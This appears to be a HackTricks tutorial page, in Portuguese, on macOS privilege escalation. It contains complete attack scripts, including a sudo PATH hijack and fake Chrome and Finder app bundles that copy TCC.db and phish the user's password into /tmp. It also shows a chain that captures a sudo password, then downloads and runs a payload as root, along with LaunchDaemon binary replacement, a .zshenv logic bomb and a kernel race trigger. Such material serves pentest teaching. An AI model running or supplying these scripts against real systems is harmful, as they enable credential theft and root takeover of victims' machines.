# Escalonamento de privilégios no macOS

{{#include ../../banners/hacktricks-training.md}}

## Escalonamento de privilégios do TCC

Se você chegou aqui procurando informações sobre escalonamento de privilégios do TCC, acesse:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Escalonamento de privilégios no Linux

Muitas técnicas de escalonamento de privilégios que afetam o Linux ou outros sistemas semelhantes ao Unix também se aplicam ao macOS. Veja:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interação com o usuário

### Sudo Hijacking

Você pode encontrar a técnica original de [Sudo Hijacking na publicação sobre escalonamento de privilégios no Linux](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

No entanto, o macOS **mantém** o **`PATH`** do usuário quando ele executa **`sudo`**. Isso significa que outra forma de realizar esse ataque seria **sequestrar outros binários** que a vítima ainda executa ao **usar sudo:**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Observe que um usuário que utiliza o terminal provavelmente terá o **Homebrew instalado**. Portanto, é possível sequestrar binários em **`/opt/homebrew/bin`**.

### Dock Impersonation

Com um pouco de **social engineering**, você poderia **se passar, por exemplo, pelo Google Chrome** no Dock e, na verdade, executar seu próprio script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Algumas sugestões:

- Verifique se há um Chrome no Dock e, se houver, **remova** essa entrada e **adicione** a entrada **falsa** do **Chrome na mesma posição** no array do Dock.

<details>
<summary>Script de impersonation do Chrome no Dock</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Algumas sugestões:

- Você **não pode remover o Finder do Dock**, então, se for adicioná-lo ao Dock, pode colocar o Finder falso ao lado do verdadeiro. Para isso, é preciso **adicionar a entrada do Finder falso no início do array do Dock**.
- Outra opção é não colocá-lo no Dock e simplesmente abri-lo. “Finder pedindo para controlar o Finder” não é tão estranho.
- Outra opção para **escalar privilégios para root sem pedir** a senha com uma caixa de diálogo horrível é fazer o Finder realmente pedir a senha para executar uma ação privilegiada:
  - Peça ao Finder para copiar um novo arquivo **`sudo`** para **`/etc/pam.d`** (o prompt de senha indicará que “o Finder quer copiar sudo”).
  - Peça ao Finder para copiar um novo **Authorization Plugin** (você pode controlar o nome do arquivo para que o prompt de senha indique que “o Finder quer copiar Finder.bundle”).

<details>
<summary>Script de impersonação do Finder no Dock</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Phishing por prompt de senha + reutilização de sudo

Malware frequentemente abusa da interação do usuário para **capturar uma senha com privilégios de sudo** e reutilizá-la programaticamente. Um fluxo comum:

1. Identificar o usuário conectado com `whoami`.
2. **Repetir os prompts de senha** até que `dscl . -authonly "$user" "$pw"` retorne sucesso.
3. Armazenar a credencial em cache (por exemplo, `/tmp/.pass`) e executar ações privilegiadas com `sudo -S` (senha via stdin).

Exemplo de cadeia mínima:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

A senha roubada pode então ser reutilizada para **limpar a quarentena do Gatekeeper com `xattr -c`**, copiar LaunchDaemons ou outros arquivos privilegiados e executar etapas adicionais sem interação.<sup>[[1]](#references)</sup>

## Vetores específicos de versões mais recentes do macOS (2023–2026)

### `AuthorizationExecuteWithPrivileges` descontinuado ainda pode ser usado

`AuthorizationExecuteWithPrivileges` foi descontinuado na versão 10.7, mas **ainda funciona no Sonoma/Sequoia**. Muitos atualizadores comerciais invocam `/usr/libexec/security_authtrampoline` com um caminho não confiável. Se o binário de destino permitir escrita pelo usuário, você pode plantar um trojan e aproveitar o prompt legítimo:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Combine com os **truques de masquerading acima** para exibir um diálogo de senha convincente.


### Triagem de helper privilegiado / XPC

Muitas escaladas de privilégio modernas em macOS de terceiros seguem o mesmo padrão: um **LaunchDaemon root** expõe um **serviço Mach/XPC** de **`/Library/PrivilegedHelperTools`**, e então o helper **não valida o cliente**, valida-o **tarde demais** (condição de corrida de PID) ou expõe um **método root** que consome um **caminho/script controlado pelo usuário**. Essa é a classe de vulnerabilidade por trás de muitos bugs recentes em helpers de clientes VPN, launchers de jogos e atualizadores.<sup>[[2]](#references)</sup>

Checklist rápido de triagem:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Preste atenção especial a helpers que:

- continuam aceitando solicitações **após a desinstalação** porque o job permaneceu carregado no `launchd`
- executam scripts ou leem configurações de **`/Applications/...`** ou de outros caminhos graváveis por usuários sem privilégios de root
- dependem de validação do peer baseada em **PID** ou apenas em **bundle-id**, que pode estar sujeita a race condition

Para mais detalhes sobre bugs de autorização em helpers, consulte [esta página](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Herança do ambiente de scripts do PackageKit (CVE-2024-27822)

Até a Apple corrigir o problema no **Sonoma 14.5**, **Ventura 13.6.7** e **Monterey 12.7.5**, instalações iniciadas pelo usuário via **`Installer.app`** / **`PackageKit.framework`** podiam executar scripts PKG como root dentro do ambiente do usuário atual. Isso significa que um pacote usando **`#!/bin/zsh`** carregaria o **`~/.zshenv`** do atacante e o executaria como root quando a vítima instalasse o pacote.<sup>[[3]](#references)</sup>

Isso é especialmente interessante como **logic bomb**: basta obter um foothold na conta do usuário e acesso de escrita a um arquivo de inicialização do shell; depois, é só esperar que o usuário execute qualquer instalador vulnerável baseado em **zsh**. Isso geralmente **não** se aplica a implantações via **MDM/Munki**, pois elas são executadas no ambiente do usuário root.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Se quiser se aprofundar em abusos específicos de instaladores, confira também [esta página](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Colisão de destino do instalador via `.localized`

Alguns instaladores de terceiros registram um LaunchDaemon root cujo executável é referenciado por um caminho fixo dentro de `/Applications/Target.app`. Se um atacante puder criar esse bundle primeiro com um **identificador de bundle diferente**, o Installer poderá preservar o chamariz e instalar o app real em `/Applications/Target.localized/Target.app`. O daemon ainda aponta para o caminho original. Portanto, um executável controlado pelo atacante dentro do bundle chamariz poderá ser executado posteriormente como root.<sup>[[8]](#references)</sup>

Os pré-requisitos importantes são:<sup>[[8]](#references)</sup>

1. O atacante pode criar ou controlar o caminho esperado do aplicativo.
2. O pacote não remove o bundle conflitante.
3. O job privilegiado usa um caminho fixo dentro desse bundle.
4. O usuário ou um fluxo de trabalho do MDM instala o pacote e registra o job.

Procure bundles realocados e, em seguida, revise os destinos dos LaunchDaemon usando o loop de enumeração na próxima seção:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Um instalador mais seguro resolve o local final do bundle e mantém executáveis privilegiados em um local pertencente ao root, como `/Library/PrivilegedHelperTools`. Ele também deve verificar a propriedade e a assinatura de código antes de registrar ou iniciar o job.<sup>[[8]](#references)</sup>

### Hijack de destino gravável do LaunchDaemon

Um plist do LaunchDaemon pode pertencer ao root, enquanto `Program` ou a primeira entrada de `ProgramArguments` aponta para um diretório gravável pelo usuário. Verifique o **caminho inteiro**, não apenas as permissões do executável. Se o diretório pai for gravável, um atacante poderá renomear um executável pertencente ao root e criar um substituto no mesmo caminho. O substituto será executado como root na próxima vez que o job for iniciado. Uma reinicialização ou um reinício normal do serviço é suficiente. O atacante não precisa ter permissão para executar `launchctl bootstrap` no domínio do sistema.<sup>[[7]](#references)</sup>

Enumere primeiro cada destino e seu diretório pai imediato:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Quando o arquivo ou seu diretório pai puder ser gravado, preserve o binário original e substitua o caminho por um payload executável. Em seguida, aguarde a reinicialização do daemon já carregado.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### Race no ponteiro de credenciais do XNU SMR (CVE-2025-24118)

O caminho vulnerável `kauth_cred_proc_update` atualizava `proc_ro.p_ucred` com a API não atômica `zalloc_ro_mut`, enquanto os leitores SMR carregavam o ponteiro sem um lock. O trigger público usa um binário setgid preparado especialmente. Uma thread alterna entre seus IDs de grupo real e efetivo enquanto outra thread entra repetidamente em uma syscall como `getgid()`.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Trate isso como uma **race primitive**, não como um exploit root pronto para uso. O PoC publicado demonstra um ponteiro de credenciais parcialmente sobrescrito. Geralmente, isso termina em kernel panic. O pesquisador só reproduziu a corrupção em Intel e não demonstrou controle determinístico sobre o objeto de credenciais resultante. A Apple alterou a atualização para uma troca atômica de ponteiros no macOS 15.3.<sup>[[4]](#references)</sup>

### Bypass de SIP via Migration Assistant ("Migraine", CVE-2023-32369)

Mesmo que você já tenha root, o SIP ainda bloqueia gravações em locais do sistema. O bug **Migraine** explora o entitlement do Migration Assistant `com.apple.rootless.install.heritable` para iniciar um processo filho que herda o bypass de SIP e sobrescreve caminhos protegidos (por exemplo, `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> A cadeia:

1. Obtenha root em um sistema ativo.
2. Acione o `systemmigrationd` com um estado elaborado para executar um binário controlado pelo invasor.
3. Use o entitlement herdado para modificar arquivos protegidos pelo SIP, mantendo a persistência mesmo após a reinicialização.

### Contrabando de expressões NSPredicate/XPC (classe de bugs CVE-2023-23530/23531)

Vários daemons da Apple aceitam objetos **NSPredicate** via XPC e validam apenas o campo `expressionType`, que pode ser controlado pelo invasor. Ao criar um predicate que avalia selectors arbitrários, é possível obter **execução de código em serviços XPC root/system** (por exemplo, `coreduetd`, `contextstored`). Quando combinado com uma fuga inicial do sandbox de um app, isso permite **escalada de privilégios sem avisos ao usuário**. Procure endpoints XPC que desserializam predicates e não tenham um visitor robusto.<sup>[[6]](#references)</sup>

## TCC - Escalada de privilégios para root

### CVE-2020-9771 - bypass de TCC via mount_apfs e escalada de privilégios

**Qualquer usuário** (até mesmo usuários sem privilégios) pode criar e montar um snapshot do Time Machine com `-o noowners` e **acessar TODOS os arquivos** desse snapshot, ignorando as verificações de propriedade do volume ativo. O único privilégio necessário é que o aplicativo usado (como o `Terminal`) tenha **Acesso Total ao Disco** (`kTCCServiceSystemPolicyAllfiles`).

Os comandos e a explicação completa estão na página de bypasses de TCC:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Informações confidenciais

Isso pode ser útil para escalar privilégios:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, o ano do Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: escalada local de privilégios no AWS Client VPN para macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: escalada de privilégios no macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine": bypass de SIP (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - uma nova classe de bugs de escalada de privilégios no macOS e iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Sequestro de LaunchDaemon: escalada de privilégios e persistência por meio de permissões inseguras em pastas](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [LPE no macOS via diretório .localized](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
